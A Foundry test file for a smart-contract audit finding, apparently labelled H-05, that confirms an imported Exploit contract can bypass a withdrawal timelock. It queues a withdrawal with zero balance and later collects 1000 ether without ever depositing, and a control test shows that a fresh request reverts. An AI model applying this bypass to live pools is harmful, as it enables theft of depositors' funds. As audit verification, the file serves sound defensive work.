// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import "forge-std/Test.sol";
import {Exploit} from "./66506-h-05-bypassing-withdrawal-timelock-via-pre-requests-and-tran.sol";
contract Finding66506Test is Test {
    function test_exploit_prequeue_bypasses_timelock() public {
        vm.warp(1000);
        Exploit e = new Exploit();
        e.queue();
        assertEq(e.rToken().balanceOf(address(e)), 0, "queued with zero balance");
        vm.warp(1000 + 30 minutes + 1);
        e.complete();
        assertEq(e.underlying().balanceOf(address(e)), 1000 ether, "bob received 1000");
        assertEq(e.pool().depositBlock(address(e)), 0, "bob never deposited");
        assertEq(e.pool().depositBlock(address(e.alice())), block.timestamp, "alice deposited this block");
    }
    function test_control_fresh_request_is_not_ready() public {
        vm.warp(2801);
        Exploit e = new Exploit();
        e.queue();
        vm.expectRevert(bytes("timelock"));
        e.complete();
    }
}
